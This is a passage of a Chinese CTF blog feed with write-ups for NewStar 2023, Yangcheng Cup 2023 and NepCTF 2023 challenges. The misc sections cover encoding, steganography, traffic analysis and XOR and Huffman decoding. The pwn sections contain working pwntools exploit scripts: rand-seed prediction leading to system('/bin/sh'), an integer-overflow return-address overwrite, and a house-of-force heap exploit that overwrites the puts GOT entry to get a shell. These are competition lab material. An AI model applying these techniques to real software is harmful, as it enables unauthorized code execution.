class="string">b&#x27;\x69&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Random"><a href="#Random" class="headerlink" title="Random:"></a>Random:</h3><p>利用time的时间戳做随机数种子，但我们自己就能拿到这个时间戳，所以第一步的“随机”就不存在了，</p><p>而后面的一步就不是我们能操控的了，会执行一个system(command)，不过当command随机到“$“1和2时这个command就可以用我们输入的参数决定了。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./random&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28598</span>)</span><br><span class="line">dll = cdll.LoadLibrary(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./random&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">s = <span class="keyword">lambda</span> a:p.send(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a:p.sendline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">uu64=<span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">get_libc = <span class="keyword">lambda</span> :u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">plo = <span class="keyword">lambda</span> o:p64(libc_base+o)</span><br><span class="line"></span><br><span class="line">time_seed=<span class="built_in">int</span>(time.time())</span><br><span class="line">seed = dll.srand(time_seed)</span><br><span class="line">rand = <span class="built_in">str</span>(dll.rand())</span><br><span class="line">sla(<span class="string">&#x27;number?\n&#x27;</span>,rand)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行：python random1.py &#x2F;bin&#x2F;sh &#x2F;bin&#x2F;sh</p><p>此时的第一和第二个参数就都是&#x2F;bin&#x2F;sh了</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc:"></a>misc:</h2><h3 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret:"></a>CyberChef’s Secret:</h3><p>编码题</p><p>根据题目名字直接拿去赛博厨子跑一下：<br><img src="/img/newstar2023/week1/3.png" alt="image-20230925112204194"></p><p>可以看到是经过base32,base58和base64</p><p>flag：flag{Base_15_S0_Easy_^_^}</p><h3 id="机密图片："><a href="#机密图片：" class="headerlink" title="机密图片："></a>机密图片：</h3><p>图片隐写</p><p>Png图片，拿去zsteg一下，直接出flag：</p><p><img src="/img/newstar2023/week1/4.png" alt="image-20230925112549039"></p><p>flag：flag{W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece}</p><h3 id="流量！鲨鱼！："><a href="#流量！鲨鱼！：" class="headerlink" title="流量！鲨鱼！："></a>流量！鲨鱼！：</h3><p>流量题</p><p>导出http对象，结合响应包是200的看到有个文件名是“.ffffllllllll11111144444GGGGGG|base64”</p><p>下载下来是个经过编码的字符串：Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo&#x3D;</p><p>拿去base64一下</p><p><img src="/img/newstar2023/week1/5.png" alt="image-20230925113752267"></p><p>flag：flag{Wri35h4rk_1s_u53ful_b72a609537e6}</p><h3 id="压缩包们："><a href="#压缩包们：" class="headerlink" title="压缩包们："></a>压缩包们：</h3><p>出现一串base64字符：</p><p><img src="/img/newstar2023/week1/6.png" alt="image-20230925114433469"></p><p><img src="/img/newstar2023/week1/7.png" alt="image-20230925114413323"></p><p>猜测是压缩包密码提示</p><p>发现应该是个压缩包，但前面字节得改成“50 4B 03 04”</p><p>提取出flag.zip</p><p>提取损坏，结合前面的6位数，猜测是改了加密位，补回去后爆破一下</p><p><img src="/img/newstar2023/week1/8.png" alt="image-20230925181658693"></p><p><img src="/img/newstar2023/week1/i9.png" alt="image-20230925181630353"></p><p>flag：flag{y0u_ar3_the_m4ter_of_z1111ppp_606a4adc}</p><h3 id="隐秘的眼睛"><a href="#隐秘的眼睛" class="headerlink" title="隐秘的眼睛:"></a>隐秘的眼睛:</h3><p>根据题目名应该是silent eyes</p><p><img src="/img/newstar2023/week1/10.png" alt="image-20230925120233778"></p><p>flag：flag{R0ck1ng_y0u_63b0dc13a591}</p><h3 id="空白格："><a href="#空白格：" class="headerlink" title="空白格："></a>空白格：</h3><p>一堆空格和tab，说明是whitespace，找个解密工具解一下：</p><p><a href="https://vii5ard.github.io/whitespace/">Whitelips the Esoteric Language IDE (vii5ard.github.io)</a></p><p><img src="/img/newstar2023/week1/11.png" alt="image-20230925122729844"></p><p>flag：flag{w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04}</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023羊城杯决赛WP</title>
      <link href="/2023/09/09/2023%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86WP/"/>
      <url>/2023/09/09/2023%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86WP/</url>
      
        <content type="html"><![CDATA[<h1 id="2023羊城杯部分wp"><a href="#2023羊城杯部分wp" class="headerlink" title="2023羊城杯部分wp"></a>2023羊城杯部分wp</h1><p>比赛时脑抽了，背大锅呜呜呜，简单写写记录下</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="arrary-index-bank"><a href="#arrary-index-bank" class="headerlink" title="arrary_index_bank:"></a>arrary_index_bank:</h3><p>整数溢出，没什么好说的，“1”能泄露libc地址，“2”输入0x800000000000000f能修改返回地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;10.1.114.2&#x27;,10000)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./index&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">s = <span class="keyword">lambda</span> a:p.send(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a:p.sendline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">uu64=<span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">get_libc = <span class="keyword">lambda</span> :u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">plo = <span class="keyword">lambda</span> o:p64(libc_base+o)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Whose account?\n&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;accounts[-1] = &#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">10</span>)</span><br><span class="line">stack_addr-=<span class="number">0x1426</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">win=stack_addr+<span class="number">0x1310</span>+<span class="number">5</span></span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Whose account?\n&#x27;</span>,<span class="string">b&#x27;-9223372036854775801&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(win))</span><br><span class="line"><span class="built_in">print</span>(win)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sla(<span class="string">&#x27;How much?\n&#x27;</span>,<span class="built_in">str</span>(win))</span><br><span class="line"><span class="comment">#sla(&#x27;&gt; &#x27;,b&#x27;3&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>fix：修复判断正数跳转</p><h3 id="ez-force"><a href="#ez-force" class="headerlink" title="ez_force:"></a>ez_force:</h3><p>house of force，比赛时脑子抽了，最后十分钟才想起force这个东西，fix阶段全修完才继续做，背大锅了，不然能混个三等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./force&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./force&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">s = <span class="keyword">lambda</span> a:p.send(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a:p.sendline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">uu64=<span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">get_libc = <span class="keyword">lambda</span> :u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">plo = <span class="keyword">lambda</span> o:p64(libc_base+o)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,context</span>):</span><br><span class="line">    sla(<span class="string">&#x27;4.go away&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;which index?\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&#x27;how much space do u want?\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;now what to write?\n&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;the balckbroad on &#x27;</span>)</span><br><span class="line">heap_addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27; &#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">heap_base=heap_addr-<span class="number">0x1020</span></span><br><span class="line">top_heap=heap_base+<span class="number">0x1030</span></span><br><span class="line">put_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;heap:&#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">offest=-(top_heap-put_got)+<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;offest:&#x27;</span>+<span class="built_in">hex</span>(offest))</span><br><span class="line">add(<span class="number">1</span>,offest,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">b&#x27;\x47\x12\x8f&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;4.go away&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;which index?\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;how much space do u want?\n&#x27;</span>,<span class="string">b&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>fix：read的字节数控制跟创建堆块的大小一样</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc:"></a>misc:</h2><p>###easy00aes</p><p>emmmm，断网，有离线工具，一把梭了</p><p>简单写下思路：</p><p>foremost分离得到压缩包，密码是那张图片文件名base64，得到flag.jpg和key.txt，key.txt拿去零宽隐写得到key（大部分队伍卡在这一步，因为断网了），flag.jpg其实是png，改宽高得到密文，拿去aes解密即可得到flag</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Nepctf2023 WP</title>
      <link href="/2023/08/13/NepCTF2023%20WP/"/>
      <url>/2023/08/13/NepCTF2023%20WP/</url>
      
        <content type="html"><![CDATA[<h1 id="Nepctf2023-WP"><a href="#Nepctf2023-WP" class="headerlink" title="Nepctf2023 WP"></a>Nepctf2023 WP</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc:"></a>misc:</h2><h3 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin:"></a>Checkin:</h3><p>签到题直接交</p><h3 id="陌生的语言："><a href="#陌生的语言：" class="headerlink" title="陌生的语言："></a>陌生的语言：</h3><p>根据提示可以搜到小魔女学园，搜索里面的语言发现有个帖子：</p><p><img src="/img/Nepctf2023/1.png" alt="image-20230729173700154"></p><p>古龙语和新月文字，</p><p><img src="/img/Nepctf2023/2.png" alt="image-20230812221001806"></p><p><img src="/img/Nepctf2023/3.png" alt="image-20230812221001806"></p><p>对照得到：</p><p>NepCTF{NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC}</p><h3 id="小叮弹钢琴："><a href="#小叮弹钢琴：" class="headerlink" title="小叮弹钢琴："></a>小叮弹钢琴：</h3><p>音频放大得到一串十六进制数，但不知道咋用，前面还有一串不知道是啥</p><p><img src="/img/Nepctf2023/4.png" alt="image-20230812222137422"></p><p>听完之后明显的摩斯密码解码：</p><p>-.– — ..- … …. — ..- .-.. -.. ..- … . - …. .. … - — -..- — .-. … — – . - …. .. -. –.</p><p><img src="/img/Nepctf2023/5.png" alt="image-20230812222102385"></p><p>说明得去异或一下，但得转为小写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">x=<span class="string">&#x27;370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17&#x27;</span></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line">n=<span class="string">&#x27;youshouldusethistoxorsomething&#x27;</span></span><br><span class="line">z=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">    <span class="built_in">str</span>=x[a:a+<span class="number">2</span>]</span><br><span class="line">    <span class="comment"># print(str)</span></span><br><span class="line">    w=<span class="built_in">int</span>(binascii.b2a_hex(n[i].encode()), <span class="number">16</span>) ^ <span class="built_in">int</span>(<span class="built_in">str</span>, <span class="number">16</span>)</span><br><span class="line">    z+=binascii.a2b_hex(<span class="built_in">hex</span>(w)[<span class="number">2</span>:])</span><br><span class="line">    <span class="built_in">print</span>(binascii.a2b_hex(<span class="built_in">hex</span>(w)[<span class="number">2</span>:]))</span><br><span class="line">    a+=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(z)</span><br></pre></td></tr></table></figure><p><img src="/img/Nepctf2023/6.png" alt="image-20230813201138882"></p><p>flag：NepCTF{h4ppy_p14N0}</p><h3 id="ConnectedFive："><a href="#ConnectedFive：" class="headerlink" title="ConnectedFive："></a>ConnectedFive：</h3><p>五子棋，后面看了是送分题才去做，先拿到42个五连就给flag：</p><p><img src="/img/Nepctf2023/7.png" alt="image-20230813234341244"></p><h3 id="与AI共舞的哈夫曼："><a href="#与AI共舞的哈夫曼：" class="headerlink" title="与AI共舞的哈夫曼："></a>与AI共舞的哈夫曼：</h3><p>emmmm，根据描述直接chatgpt:</p><p><img src="/img/Nepctf2023/8.png" alt="image-20230813225212776"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HuffmanNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, char, freq</span>):</span><br><span class="line">        self.char = char</span><br><span class="line">        self.freq = freq</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lt__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> self.freq &lt; other.freq</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_tree</span>(<span class="params">frequencies</span>):</span><br><span class="line">    heap = [HuffmanNode(char, freq) <span class="keyword">for</span> char, freq <span class="keyword">in</span> frequencies.items()]</span><br><span class="line">    heapq.heapify(heap)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(heap) &gt; <span class="number">1</span>:</span><br><span class="line">        left = heapq.heappop(heap)</span><br><span class="line">        right = heapq.heappop(heap)</span><br><span class="line">        merged = HuffmanNode(<span class="literal">None</span>, left.freq + right.freq)</span><br><span class="line">        merged.left = left</span><br><span class="line">        merged.right = right</span><br><span class="line">        heapq.heappush(heap, merged)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> heap[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_codes</span>(<span class="params">node, current_code, huffman_codes</span>):</span><br><span class="line">    <span class="keyword">if</span> node <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        huffman_codes[node.char] = current_code</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    build_huffman_codes(node.left, current_code + <span class="string">&#x27;0&#x27;</span>, huffman_codes)</span><br><span class="line">    build_huffman_codes(node.right, current_code + <span class="string">&#x27;1&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    frequencies = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> byte <span class="keyword">not</span> <span class="keyword">in</span> frequencies:</span><br><span class="line">            frequencies[byte] = <span class="number">0</span></span><br><span class="line">        frequencies[byte] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    root = build_huffman_tree(frequencies)</span><br><span class="line">    huffman_codes = &#123;&#125;</span><br><span class="line">    build_huffman_codes(root, <span class="string">&#x27;&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line">    compressed_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        compressed_data += huffman_codes[byte]</span><br><span class="line"></span><br><span class="line">    padding = <span class="number">8</span> - <span class="built_in">len</span>(compressed_data) % <span class="number">8</span></span><br><span class="line">    compressed_data += <span class="string">&#x27;0&#x27;</span> * padding</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># Write frequency information</span></span><br><span class="line">        f.write(<span class="built_in">bytes</span>([<span class="built_in">len</span>(frequencies)]))</span><br><span class="line">        <span class="keyword">for</span> byte, freq <span class="keyword">in</span> frequencies.items():</span><br><span class="line">            f.write(<span class="built_in">bytes</span>([byte, (freq &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (freq &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (freq &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, freq &amp; <span class="number">0xFF</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Write compressed data</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(compressed_data), <span class="number">8</span>):</span><br><span class="line">            byte = compressed_data[i:i+<span class="number">8</span>]</span><br><span class="line">            f.write(<span class="built_in">bytes</span>([<span class="built_in">int</span>(byte, <span class="number">2</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># Read frequency information</span></span><br><span class="line">        num_symbols = <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">        frequencies = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_symbols):</span><br><span class="line">            byte = <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">            freq = (<span class="built_in">ord</span>(f.read(<span class="number">1</span>)) &lt;&lt; <span class="number">24</span>) | (<span class="built_in">ord</span>(f.read(<span class="number">1</span>)) &lt;&lt; <span class="number">16</span>) | (<span class="built_in">ord</span>(f.read(<span class="number">1</span>)) &lt;&lt; <span class="number">8</span>) | <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">            frequencies[byte] = freq</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Rebuild Huffman tree</span></span><br><span class="line">        root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read compressed data</span></span><br><span class="line">        compressed_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            byte = f.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> byte:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            compressed_data += <span class="built_in">format</span>(<span class="built_in">ord</span>(byte), <span 